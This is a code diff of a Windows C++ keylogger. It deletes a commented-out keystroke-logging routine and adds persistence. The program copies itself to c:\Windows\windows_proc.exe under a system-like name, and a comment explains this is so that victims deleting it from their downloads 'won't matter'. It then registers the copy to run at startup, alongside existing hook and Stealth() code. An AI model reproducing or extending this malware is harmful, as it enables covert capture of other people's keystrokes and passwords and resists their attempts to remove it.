@@ -7,6 +7,8 @@
 #include <cstdio>
 #include <tchar.h>
 #include <ctime>
+#include <strsafe.h>
+#include <csignal>
 
 #include "stdafx.h";
 
@@ -137,219 +139,6 @@ void ReleaseHook()
     UnhookWindowsHookEx(_hook);
 }
 
-//int Save(unsigned int key_stroke, const char *file)
-//{
-//    FILE *OUTPUT_FILE;
-//    OUTPUT_FILE = fopen(file, "a+");
-//
-//    switch (key_stroke)
-//    {
-//    case VK_BACK:
-//        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[BACKSPACE]");
-//        break;
-//    case VK_RETURN:
-//        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[ENTER]");
-//        break;
-//    case VK_SPACE:
-//        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[SPACE]");
-//        break;
-//    case VK_TAB:
-//        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[TAB]");
-//        break;
-//    case VK_ESCAPE:
-//        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[ESCAPE]");
-//        break;
-//    case VK_END:
-//        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[END]");
-//        break;
-//    case VK_HOME:
-//        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[HOME]");
-//        break;
-//    case VK_LEFT:
-//        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[LEFT]");
-//        break;
-//    case VK_UP:
-//        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[UP]");
-//        break;
-//    case VK_RIGHT:
-//        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[RIGHT]");
-//        break;
-//    case VK_DOWN:
-//        fprintf(OUTPUT_FILE, "%s%s%s", shiftKeyText, ctrlKeyText, "[DOWN]");
-//        break;
-//    case 20:
-//        fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "[CAPSLOCK]");
-//        capsLockKey = true;
-//        break;
-//    case 48:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, ")");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "0");
-//        break;
-//    case 49:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "!");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "1");
-//        break;
-//    case 50:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "@");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "2");
-//        break;
-//    case 51:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "#");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "3");
-//        break;
-//    case 52:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "$");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "4");
-//        break;
-//    case 53:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "%");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "5");
-//        break;
-//    case 54:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "^");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "6");
-//        break;
-//    case 55:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "&");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "7");
-//        break;
-//    case 56:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "*");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "8");
-//        break;
-//    case 57:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "(");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "9");
-//        break;
-//    case 91:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "{");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "[");
-//        break;
-//    case 92:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "|");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "\\");
-//        break;
-//    case 93:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "}");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "]");
-//        break;
-//    case 161:
-//        break;
-//    case 186:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, ":");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, ";");
-//        break;
-//    case 187:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "+");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "=");
-//        break;
-//    case 188:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "<");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, ",");
-//        break;
-//    case 189:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "_");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "-");
-//        break;
-//    case 190:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, ">");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, ".");
-//        break;
-//    case 191:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "?");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "/");
-//        break;
-//    case 192:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "~");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "`");
-//        break;
-//    case 219:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "{");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "[");
-//        break;
-//    case 220:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "|");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "\\");
-//        break;
-//    case 221:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "}");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "]");
-//        break;
-//    case 222:
-//        if (shiftKeyPressed)
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "\"");
-//        else
-//            fprintf(OUTPUT_FILE, "%s%s", ctrlKeyText, "'");
-//        break;
-//        
-//    default:
-//        if (key_stroke >= 96 && key_stroke <= 105)
-//        {
-//            key_stroke -= 48;
-//        }
-//        else if (key_stroke >= 65 && key_stroke <= 90) { // A-Z
-//                                                         // check caps lock
-//            bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
-//            // check shift key
-//            if (shiftKeyPressed) {
-//                lowercase = !lowercase;
-//            }
-//
-//            if (lowercase) key_stroke += 32;
-//        }
-//        fprintf(OUTPUT_FILE, "%c", key_stroke);
-//        break;
-//    }
-//    fclose(OUTPUT_FILE);
-//    return 0;
-//}
-
 void Stealth()
 {
 #ifdef visible
@@ -441,14 +230,25 @@ void RegisterProgram()
     wchar_t szPathToExe[MAX_PATH];
 
     GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
-    RegisterMyProgramForStartup(L"KeyLogger", szPathToExe, L"-foobar");
+    RegisterMyProgramForStartup(L"KeyLogger", L"c:\\Windows\\windows_proc.exe", L"-foobar");
 }
-
 
 int main()
 {
-    if (IsMyProgramRegisteredForStartup(L"KeyLogger") == false)
-        RegisterProgram();
+
+	// Copies over file for later use so even if they delete the keylogger from their downloads, it won't matter :)
+	char buffer[MAX_PATH];
+	GetModuleFileNameA(NULL, buffer, MAX_PATH);
+
+	char command[MAX_PATH + 50];
+	sprintf(command, "copy /y %s c:\\Windows\\windows_proc.exe > NUL", buffer, buffer);
+
+	system(command);
+
+	if (IsMyProgramRegisteredForStartup(L"KeyLogger") == false)
+		RegisterProgram();
+
+	std::cout << buffer << std::endl;
 
     startTime = GetTickCount();
 
